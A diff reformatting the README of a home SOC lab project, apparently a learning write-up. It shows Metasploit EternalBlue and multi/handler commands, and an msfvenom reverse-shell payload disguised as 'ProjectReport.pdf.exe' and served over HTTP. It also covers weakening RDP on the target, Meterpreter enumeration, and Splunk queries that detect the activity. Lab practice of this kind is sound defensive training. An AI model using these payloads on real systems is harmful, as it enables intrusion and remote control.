@@ -17,7 +17,7 @@
 
 ---  
 ## 📌#Introduction  
-    This project demonstrates the creation of a Security Operations Center Home (SOC Home) Lab Environment for practicing cybersecurity attacks and monitoring. The lab simulates a realistic attack–defense scenario within an isolated network.  
+This project demonstrates the creation of a Security Operations Center Home (SOC Home) Lab Environment for practicing cybersecurity attacks and monitoring. The lab simulates a realistic attack–defense scenario within an isolated network.  
 
 The setup includes:  
 💻 Windows 10 Virtual Machine – The target machine  
@@ -129,12 +129,12 @@ Install Sysmon from Sysinternals using sysmonconfig.xml → Verify it’s runnin
 🔍 Targeted SMB protocol (Port 445) for exploitation.  
 💣 Attempted EternalBlue (MS17-010) using Metasploit:  
 
-use exploit/windows/smb/ms17_010_eternalblue  
-set RHOSTS 192.168.56.2  
-set PAYLOAD windows/x64/meterpreter/reverse_tcp  
-set LHOST 192.168.56.3  
-set LPORT 4444  
-exploit  
+    use exploit/windows/smb/ms17_010_eternalblue  
+    set RHOSTS 192.168.56.2  
+    set PAYLOAD windows/x64/meterpreter/reverse_tcp  
+    set LHOST 192.168.56.3  
+    set LPORT 4444  
+    exploit  
 
 ❌ Result: No luck — Windows 10 machine was patched 🛡 and immune to the exploit.  
 
@@ -152,7 +152,9 @@ Enabled Remote Desktop from the system settings.
 Nmap scan still showed RDP as closed 🚫.  
 🗝 Registry Tweak:  
 Opened regedit → navigated to:  
-HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server  
+
+    HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server 
+
 Changed fDenyTSConnections value to 0 ✅ (enabled RDP directly from registry, bypassing GUI).  
 
 🔄 Service Management:  
@@ -160,7 +162,9 @@ Located TermService (Remote Desktop Services).
 Stopped → Started → Restarted multiple times to ensure activation.  
 ⚙ Group Policy Configuration (gpedit.msc):  
 Enabled Allow users to connect remotely under:  
-Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections  
+
+    Computer Configuration → Administrative Templates → Windows Components → Remote Desktop Services → Remote Desktop Session Host → Connections  
+
 Ensured Network Level Authentication was disabled to reduce restrictions.  
 
 📊 Final Check:  
@@ -180,7 +184,7 @@ Ready for RDP exploitation in the next step!
 With RDP (3389) now open 🔓, I moved on to creating and delivering a malicious payload for exploitation.  
 🛠 Payload Creation (MSFvenom)  
 
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  
+    msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe -o ProjectReport.pdf.exe  
 
 💡 Payload: Windows Meterpreter Reverse TCP  
 📍 LHOST: Attacker machine IP  
@@ -188,26 +192,25 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.3 LPORT=4444 -f exe
 
 📡 Setting Up the Listener (Metasploit)  
 
-msfconsole  
-use exploit/multi/handler  
-set PAYLOAD windows/meterpreter/reverse_tcp  
-set LHOST 192.168.56.3  
-set LPORT 4444  
-exploit  
+    msfconsole  
+    use exploit/multi/handler  
+    set PAYLOAD windows/meterpreter/reverse_tcp  
+    set LHOST 192.168.56.3  
+    set LPORT 4444  
+    exploit  
 🎯 Waiting for the target to execute the payload...  
 
 🌐 Hosting Payload with Python  
 To easily transfer the file to the target, I started a Python HTTP server:  
 
-python3 -m http.server 9999  
+    python3 -m http.server 9999  
 
 📂 Payload hosted at:  
-http://192.168.56.3:9999/ProjectReport.pdf.exe  
+
+    http://192.168.56.3:9999/ProjectReport.pdf.exe  
 📸 Result:  
 Payload successfully hosted & accessible ✅  
-Ready for delivery to target 🎯 (execution attempt covered in the next step)  
-
-📸 [Image placeholders: MSFvenom terminal output | Metasploit listener setup | Python HTTP server running on 9999]  
+Ready for delivery to target 🎯 (execution attempt covered in the next step)   
 
 <p align="center">
   <img src="https://github.com/user-attachments/assets/3e75489f-aa7b-4aa8-abca-54ea410ca2d7" alt="LAN Segment & IP settings" width="350" />
@@ -231,16 +234,14 @@ Meterpreter session opened on Kali 🎉
 🔍 Post-Exploitation Actions  
 Inside Meterpreter:  
 
-ls  
-shell  
-ipconfig  
-ipconfig /all  
-net localgroup  
-net user  
+    ls  
+    shell  
+    ipconfig  
+    ipconfig /all  
+    net localgroup  
+    net user  
 
 📌 Gathered network info, checked user accounts, and enumerated privileges 👀  
-
-📸 [Image placeholders: Download warning in Chrome | Meterpreter session on Kali | Commands executed]  
 
 <p align="center">
   <img src="https://github.com/user-attachments/assets/ca0e12ba-a017-4a4f-9d0b-b420e156b3ca" alt="LAN Segment & IP settings" width="350" />
@@ -255,7 +256,8 @@ net user
 🛠️ Actions Performed  
 1️⃣ Opened Splunk → Search & Reporting App 📈  
 2️⃣ Ran initial search:  
-index=endpoint  
+
+    index=endpoint  
 🔍 (endpoint was the index created earlier to store endpoint logs — including Sysmon data)  
 3️⃣ Located multiple logs for system activities.  
 4️⃣ Focused search to find malware traces:  
@@ -264,15 +266,15 @@ index=endpoint
 </p>
 
 
-index=endpoint "projectreport.pdf.exe"  
+    index=endpoint "projectreport.pdf.exe"  
 📌 Found several logs related to the file execution.  
 5️⃣ Opened a specific log → copied Process GUID 🆔  
 6️⃣ Queried again with the GUID:  
 index=endpoint "<Process_GUID>"  
 📊 Retrieved detailed logs of the malware process lifecycle.  
 7️⃣ Refined output with table formatting for clarity:  
-index=endpoint "<Process_GUID>"  
-| table _time, parent_process, image, command_line  
+
+    index=endpoint "<Process_GUID>"  | table _time, parent_process, image, command_line  
 
 🖥️ Columns included:  
 _time ⏱️ — Timestamp of event  
@@ -301,16 +303,15 @@ command_line 💻 — Full execution command
 This GUID was used as the pivot point to find related activity.  
 3️⃣ Ran a broader search in Splunk to catch all processes spawned after the malware execution:  
 
-index=endpoint "<Process_GUID>"  
-OR parent_process="<Malware_Process_Path>"  
+    index=endpoint "<Process_GUID>" OR parent_process="<Malware_Process_Path>"  
 📌 This helped reveal not only the malware process but also child processes triggered by it.  
 
 4️⃣ Looked specifically for commands that matched the attacker’s actions:  
 ipconfig, net user, net localgroup 🧾  
 These would appear in logs as part of cmd.exe or powershell.exe executions.  
 5️⃣ Refined query for command-line activities:  
-index=endpoint ("ipconfig" OR "net user" OR "net localgroup")  
-| table _time, parent_process, image, command_line  
+
+    index=endpoint ("ipconfig" OR "net user" OR "net localgroup") | table _time, parent_process, image, command_line  
 
 💡 This showed:  
 Timestamps matching when commands were run in Meterpreter shell.  
